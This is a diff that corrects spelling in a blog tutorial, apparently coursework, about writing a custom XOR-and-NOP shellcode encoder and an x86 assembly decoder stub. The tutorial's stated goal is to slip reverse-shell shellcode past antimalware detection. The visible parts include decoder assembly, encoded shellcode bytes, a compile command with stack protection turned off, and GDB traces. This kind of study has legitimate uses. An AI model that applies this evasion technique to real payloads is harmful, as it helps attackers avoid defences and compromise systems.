@@ -10,10 +10,10 @@ toc: true
 ## Introduction ##
 
 Sending well known shell code to target machine would most probably be detected by antimalware solution . 
-One way to bypass antimalware detection is to encode shell code and to have higher chances for sucessful bypass, custom encoder should be created and used.  
-In this blog post we will go thru process of creating simple encoder and decored. 
-As an example we will preform XOR operation on every shell code byte with value ```0x0F``` (encoding key) and add NOP (```\x90```) instrunction after every encoded shell code byte. 
-This endocer will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
+One way to bypass antimalware detection is to encode shell code and to have higher chances for successful bypass, custom encoder should be created and used.  
+In this blog post we will go thru process of creating simple encoder and decoded. 
+As an example we will preform XOR operation on every shell code byte with value ```0x0F``` (encoding key) and add NOP (```\x90```) instruction after every encoded shell code byte. 
+This encoder will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
 During decoding procedure, XOR operation will be preformed to restore original shell code and NOP instructions will be ignored.  
 
 ## Shell code ##
@@ -57,12 +57,12 @@ Encoded shellcode: 0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0
 
 ## Decoder ##
 
-To sucessfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with previously defined key ```0x0F```. 
-Every other byte will be skipped as it is NOP (```0x90```) instrunction.  
+To successfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with previously defined key ```0x0F```. 
+Every other byte will be skipped as it is NOP (```0x90```) instruction.  
 We will use following registers for decoding: 
 * EAX for XOR operations
 * ECX as counter for decoding stub
-* EDX as pointer to beggining of encoded (and later decoded) shell code
+* EDX as pointer to beginning of encoded (and later decoded) shell code
 * ESI as pointer to byte which we need to decode
 * EDI as pointer to memory address where decoded byte will be placed overwriting original byte
 
@@ -82,8 +82,8 @@ _start:
         xor edi, edi             ; clear EDI - used as pointer to decoded shell code destination
         mov cl, len              ; move length of the shellcode in cl
         sar cl, 1                ; divide by 2 (since we are skipping every 2nd byte which is \x90)
-        mov edx, esi             ; save pointer to beggining of shellcode from ESI to EDX
-        mov edi, esi             ; save pointer to beggining of shellcode from ESI to EDI
+        mov edx, esi             ; save pointer to beginning of shellcode from ESI to EDX
+        mov edi, esi             ; save pointer to beginning of shellcode from ESI to EDI
 
     decoder_loop:
         mov  al, byte [esi]      ; move one byte from address pointed by ESI
@@ -125,7 +125,7 @@ With modified command, extracted opcode is following:
 
 ## Seeing decoder in action ##
 
-Next, we can use skeleton code to run and test if decoding is sucessfull. To compile it following command should be used:
+Next, we can use skeleton code to run and test if decoding is successfull. To compile it following command should be used:
 
 ```
 gcc -fno-stack-protector -z execstack -m32 skeleton.c -o encoded_revshell -g
@@ -146,15 +146,15 @@ int main()
 }
 ```
 
-By stepping thu program with GDB we can observe shell code decoding. ESI register is used for storing pointer to beggining of encoded shellcode.  
-At the beggining of decoding stub we can see that ESI register is pointing to the beggining of encoded shellcode which is located at memory address: ```0x404067```. 
+By stepping thu program with GDB we can observe shell code decoding. ESI register is used for storing pointer to beginning of encoded shellcode.  
+At the beginning of decoding stub we can see that ESI register is pointing to the beginning of encoded shellcode which is located at memory address: ```0x404067```. 
 
 ```
 gdb-peda$ info register esi
 esi            0x404067            0x404067
 ```
 
-So in order to observe decoing, we will monitor first 10 bytes starting at ```0x404067``` memory address.
+So in order to observe decoding, we will monitor first 10 bytes starting at ```0x404067``` memory address.
 Before decoding starts we can see that memory address ```0x404067``` contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)
 
 * Initial data on address ```0x404067```  
@@ -165,7 +165,7 @@ gdb-peda$ x/10b 0x404067
 0x40406f <shellcode+47>:        0x3e    0x90
 ```
 
-* content of the same address (```0x404067```) after few itterations:  
+* content of the same address (```0x404067```) after few iterations:  
 We can see that ```0x3e``` is decoded to ```0x31``` which is result of following operation ```XOR 0x0F, 0x3e``` and ```0x90``` from previous snippet is ignored and overwritten with result of ```XOR 0xfc, 0x0f``` operation. Also 3rd byte is replaced with 0x31 which is result of ```XOR 0x3e, 0x0f``` operation etc. 
 
 ```
@@ -177,7 +177,7 @@ gdb-peda$ x/10b 0x404067
  etc.
 ```
 
-* content of the same address (```0x404067```) after some more itterations:  
+* content of the same address (```0x404067```) after some more iterations:  
 We can see that decoded shell code does not contain added NOPs (```0x90```) and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.). Decoded opcodes overwrites original encoded opcodes:
 ```
 gdb-peda$ x/10b 0x404067
@@ -185,6 +185,6 @@ gdb-peda$ x/10b 0x404067
 0x40406f <shellcode+47>:        0x31    0xf6
 ```
 
-Reverse shell is sucessfuly established once decoding is finished as show on following scren shot.
+Reverse shell is successfuly established once decoding is finished as show on following scren shot.
 
 ![Custom decoder working](https://smarinovic.github.io/assets/img/slae_00018.png)
